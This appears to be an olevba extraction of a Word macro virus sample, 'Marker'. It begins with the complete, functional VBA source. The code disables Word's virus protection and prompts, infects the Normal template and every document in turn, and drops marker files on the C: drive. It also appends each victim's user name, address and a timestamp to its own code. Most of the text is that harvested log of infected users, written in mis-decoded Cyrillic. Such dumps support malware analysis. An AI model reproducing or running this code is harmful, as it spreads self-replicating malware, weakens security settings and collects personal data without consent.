olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.hi-1ab6dc21f743317e2a946412f609d40738bb91d4
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.hi-1ab6dc21f743317e2a946412f609d40738bb91d4 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub CommandButton1_Click()
ListBox1.Text1 = "a"
End Sub

' DSR & FHS , KZ, Kostanai
' KGU-EMF by DSR & FHS v0.1
Private Sub Document_Close()

On Error Resume Next

'Declare Variables
Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
Dim ad, nt As Object
Dim OurCode, UserAddress, LogData, LogFile As String

'Initialize Variables
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)

DocumentInfected = ad.CodeModule.Find("' DSR & FHS , KZ, Kostanai", 1, 1, 10, 10)
NormalTemplateInfected = nt.CodeModule.Find("' DSR & FHS , KZ, Kostanai", 1, 1, 10, 10)

'Switch the VirusProtection OFF, ConfirmConversion OFF, SaveNormalPrompt OFF
    Options.VirusProtection = False
    Options.ConfirmConversions = False
    Options.SaveNormalPrompt = False


  If (Day(Now()) <> 1) And (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = False) Then
  
    If DocumentInfected = True Then
      LogData = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)
    ElseIf NormalTemplateInfected = True Then
      LogData = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)
    End If
    
    LogData = Mid(LogData, InStr(1, LogData, "' Log" & "file -->"), Len(LogData) - InStr(1, LogData, "' Log" & "file -->"))
    
    LogFile = LogFile + Mid(Str(Int(8 * Rnd)), 2, 1)
    LogFile = "C:\bootlog" & LogFile & ".sys"
    
    Open LogFile For Output As #1
    Print #1, LogData
    Close #1
    
    Open "c:\netlog.sys" For Output As #1
    Print #1, "For YOU"
    Print #1, "SCOOTER"
    Print #1, "Wellcome to Calipso"
    Print #1, "FasterHarderScooter"
    Print #1, "Scooter on the Web: www.scooterweb.de"
    Print #1, "Wiritten by FHS & DSR (KZ, Kostanai town, KGU)"
    Print #1, "This is a simple example"
    Print #1, "read " & LogFile
    Close #1
    
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = True
    
  End If


'Make sure that some conditions are true before we continue infecting anything
If ((DocumentInfected = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate)) Or _
   ((NormalTemplateInfected = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate)) Then
   
   
  'Infect the NormalTemplate
  If DocumentInfected = True Then
  
    SaveNormalTemplate = NormalTemplate.Saved
  
    OurCode = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)

    
    'Write a log file of this NormalTemplate infection
    For I = 1 To Len(Application.UserAddress)
      If Mid(Application.UserAddress, I, 1) <> Chr(13) Then
        If Mid(Application.UserAddress, I, 1) <> Chr(10) Then
          UserAddress = UserAddress & Mid(Application.UserAddress, I, 1)
        End If
      Else
        UserAddress = UserAddress & Chr(13) & "' "
      End If
    Next I

    OurCode = OurCode & Chr(13) & _
              "' " & "* DSR & FHS , KGU EMF" & Chr(13) & _
              "' " & "00:15:54  -  Wednesday, 22.12.1999" & Chr(13) & _
              "' " & "KZ, Kostanai, KGU EMF Applied Mathematics" & Chr(13) & _
              "' " & Format(Time, "hh:mm:ss - ") & _
                     Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
              "' " & Application.UserName & Chr(13) & _
              "' " & UserAddress & Chr(13)


    nt.CodeModule.deletelines 1, nt.CodeModule.CountOfLines
    nt.CodeModule.AddFromString OurCode
    
    If SaveNormalTemplate = True Then NormalTemplate.Save
    
  End If


  'Infect the ActiveDocument
  If NormalTemplateInfected = True And _
     DocumentInfected = False Then
  
    SaveDocument = ActiveDocument.Saved
    
    OurCode = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)

    ad.CodeModule.deletelines 1, ad.CodeModule.CountOfLines
    ad.CodeModule.AddFromString OurCode
    
    If SaveDocument = True Then ActiveDocument.Save
      
  End If
  
    
End If

End Sub

' Logfile -->

' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 19:20:14 - ñðåäà, 3 ìàé 2000
' Ïîæåëàë  îñòàòüñÿ íåèçâåñòíûì
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:36:42 - âîñêðåñåíüå, 14 ìàé 2000
' Khudyakov Yuriy
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 16:27:56 - ïîíåäåëüíèê, 15 ìàé 2000
' Õóäÿêîâà
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 16:55:46 - âòîðíèê, 16 ìàé 2000
' Õóäÿêîâà
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:25:20 - ñðåäà, 17 ìàé 2000
' Õóäÿêîâà
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:48:08 - ñðåäà, 17 ìàé 2000
' Õóäÿêîâà
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:53:13 - ñðåäà, 17 ìàé 2000
' Õóäÿêîâà
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:46:39 - ñðåäà, 17 ìàé 2000
' Õóäÿêîâà
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:10:05 - ÷åòâåðã, 18 ìàé 2000
' Õóäÿêîâà
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:57:33 - âòîðíèê, 23 ìàé 2000
' Õóäÿêîâà
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 16:42:02 - âòîðíèê, 23 ìàé 2000
' Õóäÿêîâà
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:13:04 - ñðåäà, 24 ìàé 2000
' Õóäÿêîâà
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:51:44 - ñóááîòà, 17 èþí 2000
' Reanimator 98
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:56:16 - ñóááîòà, 17 èþí 2000
' Reanimator 98
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:57:13 - ñóááîòà, 17 èþí 2000
' Reanimator 98
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:11:33 - ñóááîòà, 17 èþí 2000
' Reanimator 98
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:26:34 - ïîíåäåëüíèê, 19 èþí 2000
' Reanimator 98
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:33:11 - âòîðíèê, 27 èþí 2000
' Ñ.Õ. Åñåíáàåâ
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:13:47 - âòîðíèê, 27 èþí 2000
' Ñ.Õ. Åñåíáàåâ
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:49:56 - ñðåäà, 28 èþí 2000
' Indi G.Ospanova
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:12:22 - ïîíåäåëüíèê, 17 èþë 2000
' Àëåêñàíäð
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:16:56 - ïîíåäåëüíèê, 17 èþë 2000
' Àëåêñàíäð
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 18:26:40 - âòîðíèê, 18 èþë 2000
'  Àëåêñàíäð
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 08:22:23 - ÷åòâåðã, 20 èþë 2000
'  Àëåêñàíäð
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:33:06 - ÷åòâåðã, 20 èþë 2000
'  Àëåêñàíäð
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 18:08:01 - ÷åòâåðã, 20 èþë 2000
'  Àëåêñàíäð
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:34:42 - âîñêðåñåíüå, 23 èþë 2000
'  Àëåêñàíäð
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:45:27 - âîñêðåñåíüå, 23 èþë 2000
'  Àëåêñàíäð
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:53:05 - âòîðíèê, 25 èþë 2000
' CCTT
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 08:53:34 - ÷åòâåðã, 27 èþë 2000
' ðåàíèìàòîð
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 17:37:06 - âòîðíèê, 1 àâã 2000
' Reanimator 99 CD
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:46:13 - ñðåäà, 2 àâã 2000
' Reanimator 99 CD
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 18:22:38 - ñðåäà, 2 àâã 2000
' Reanimator 99 CD
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 09:11:48 - ïîíåäåëüíèê, 21 àâã 2000
' Reanimator 99 CD
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:01:19 - ïîíåäåëüíèê, 21 àâã 2000
' Reanimator 99 CD
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 09:38:46 - âòîðíèê, 22 àâã 2000
' Reanimator 99 CD
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:14:24 - ïÿòíèöà, 25 àâã 2000
' Reanimator 99 CD
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 09:43:34 - ïÿòíèöà, 22 ñåí 2000
' Reanimator 99 CD
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:22:22 - ïÿòíèöà, 22 ñåí 2000
' Reanimator 99 CD
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:14:55 - âòîðíèê, 10 îêò 2000
' 1
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 21:48:10 - ÷åòâåðã, 19 îêò 2000
' 1
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 16:24:45 - ñðåäà, 29 íîÿ 2000
' 1
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 09:23:28 - ÷åòâåðã, 30 íîÿ 2000
' 1
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:58:47 - ÷åòâåðã, 30 íîÿ 2000
' 1
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:36:47 - ïÿòíèöà, 1 äåê 2000
' 1
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:23:31 - ïÿòíèöà, 5 ÿíâ 2001
' Serg
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:54:34 - ïîíåäåëüíèê, 8 ÿíâ 2001
' Serg
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:36:35 - âòîðíèê, 9 ÿíâ 2001
' áâã¤
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:05:48 - âòîðíèê, 9 ÿíâ 2001
' áâã¤
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 18:23:03 - âòîðíèê, 9 ÿíâ 2001
' áâã¤
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:32:55 - ñðåäà, 10 ÿíâ 2001
' áâã¤
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 09:33:04 - ïÿòíèöà, 12 ÿíâ 2001
' áâã¤
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:48:13 - ïÿòíèöà, 12 ÿíâ 2001
' áâã¤
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 01:03:22 - ïîíåäåëüíèê, 15 ÿíâ 2001
' Jordan
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 18:08:12 - ïÿòíèöà, 2 ôåâ 2001
' Serg
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 17:49:01 - ïÿòíèöà, 16 ôåâ 2001
' Serg
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:12:13 - ñóááîòà, 17 ôåâ 2001
' Alex
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:35:12 - ñóááîòà, 17 ôåâ 2001
' Alex
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:35:19 - ñóááîòà, 17 ôåâ 2001
' Alex
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:35:26 - ñóááîòà, 17 ôåâ 2001
' Alex
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:35:31 - ñóááîòà, 17 ôåâ 2001
' Alex
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:35:37 - ñóááîòà, 17 ôåâ 2001
' Alex
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:35:44 - ñóááîòà, 17 ôåâ 2001
' Alex
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:35:49 - ñóááîòà, 17 ôåâ 2001
' Alex
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:35:55 - ñóááîòà, 17 ôåâ 2001
' Alex
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:36:01 - ñóááîòà, 17 ôåâ 2001
' Alex
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:45:17 - ñóááîòà, 17 ôåâ 2001
' Alex
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:49:57 - ñóááîòà, 17 ôåâ 2001
' Alex
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:40:56 - ñóááîòà, 17 ôåâ 2001
' Alex
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:41:22 - ñóááîòà, 17 ôåâ 2001
' Alex
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 16:51:31 - ñóááîòà, 17 ôåâ 2001
' Alex
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:45:33 - ïîíåäåëüíèê, 19 ôåâ 2001
' Alex
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:22:59 - ïîíåäåëüíèê, 19 ôåâ 2001
' Alex
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:23:52 - ïÿòíèöà, 10 ìàð 2000
' ÍÈ×
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:31:09 - ïÿòíèöà, 10 ìàð 2000
' ÍÈ×
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:35:05 - ïÿòíèöà, 10 ìàð 2000
' ÍÈ×
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 16:06:09 - ñóááîòà, 11 ìàð 2000
' ÍÈ×
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 16:40:13 - ñóááîòà, 11 ìàð 2000
' ÍÈ×
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 16:58:47 - ñóááîòà, 11 ìàð 2000
' ÍÈ×
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 17:00:31 - ñóááîòà, 11 ìàð 2000
' ÍÈ×
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 17:02:15 - ñóááîòà, 11 ìàð 2000
' ÍÈ×
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:29:34 - âîñêðåñåíüå, 12 ìàð 2000
' ÍÈ×
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:26:34 - ÷åòâåðã, 15 ìàð 2001
' Ñàóëåò
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:58:59 - ÷åòâåðã, 15 ìàð 2001
' Ñàóëåò
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:26:06 - ÷åòâåðã, 15 ìàð 2001
' Ñàóëåò
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:31:34 - ïÿòíèöà, 16 ìàð 2001
' User
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:30:48 - âîñêðåñåíüå, 25 ìàð 2001
' Ñàóëåò
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:03:12 - ïîíåäåëüíèê, 26 ìàð 2001
' Ñàóëåò
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:17:57 - ïîíåäåëüíèê, 26 ìàð 2001
' Ñàóëåò
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:00:15 - ñðåäà, 11 àïð 2001
' 1
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:40:30 - ñðåäà, 11 àïð 2001
' 1
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 21:07:02 - ñðåäà, 11 àïð 2001
' 1
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 09:51:39 - ÷åòâåðã, 12 àïð 2001
' 1
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 09:53:48 - ÷åòâåðã, 12 àïð 2001
' 1
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:42:23 - ïÿòíèöà, 13 àïð 2001
' 1
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:44:47 - ïîíåäåëüíèê, 16 àïð 2001
' 1
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:27:43 - ïîíåäåëüíèê, 16 àïð 2001
' 1
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:03:09 - ÷åòâåðã, 19 àïð 2001
' 1
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:58:44 - ïÿòíèöà, 27 àïð 2001
' õõ
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 16:21:23 - ïÿòíèöà, 27 àïð 2001
' õõ
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 08:39:10 - ñóááîòà, 28 àïð 2001
' õõ
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:36:24 - ñðåäà, 2 ìàé 2001
' User
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:15:35 - ÷åòâåðã, 3 ìàé 2001
' õõ
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:43:53 - ÷åòâåðã, 3 ìàé 2001
' õõ
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:05:26 - ÷åòâåðã, 3 ìàé 2001
' õõ
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:03:44 - ÷åòâåðã, 3 ìàé 2001
' õõ
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 08:17:16 - ïÿòíèöà, 4 ìàé 2001
' õõ
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 08:38:52 - ïÿòíèöà, 4 ìàé 2001
' õõ
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 08:57:06 - ïÿòíèöà, 4 ìàé 2001
' õõ
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:25:28 - ïÿòíèöà, 4 ìàé 2001
' õõ
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:02:18 - ïÿòíèöà, 4 ìàé 2001
' õõ
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:26:15 - ïÿòíèöà, 4 ìàé 2001
' õõ
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:30:26 - ïÿòíèöà, 4 ìàé 2001
' õõ
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:45:16 - ïÿòíèöà, 4 ìàé 2001
' õõ
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:47:56 - ïÿòíèöà, 4 ìàé 2001
' õõ
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:53:14 - ïÿòíèöà, 4 ìàé 2001
' õõ
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:57:21 - ïÿòíèöà, 4 ìàé 2001
' õõ
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:53:06 - ïÿòíèöà, 4 ìàé 2001
' õõ
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:55:31 - ïÿòíèöà, 4 ìàé 2001
' õõ
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
